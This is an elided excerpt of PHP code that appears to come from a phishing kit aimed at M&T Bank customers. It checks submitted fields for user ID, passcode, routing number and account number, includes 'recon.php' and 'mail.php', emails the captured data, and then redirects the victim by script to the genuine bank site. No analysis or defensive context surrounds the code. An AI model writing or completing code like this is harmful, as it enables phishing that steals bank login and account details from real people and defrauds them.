	       ...
	       if (isset($_POST['ReasonCode']))
	         ...
	         //send email
	          ...
	          if(@mail($to, $subject, $body, $headers))
	          {
	          	...
	          	echo "<script>window.location.href='https://www3.mtb.com/".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	          ...
	          if(isset($_POST['userID'])&&isset($_POST['passcode'])&&isset($_POST['routine'])&&isset($_POST['account']))
	          {
	          include 'recon.php';
	          include 'mail.php';
	          // check for valid email address
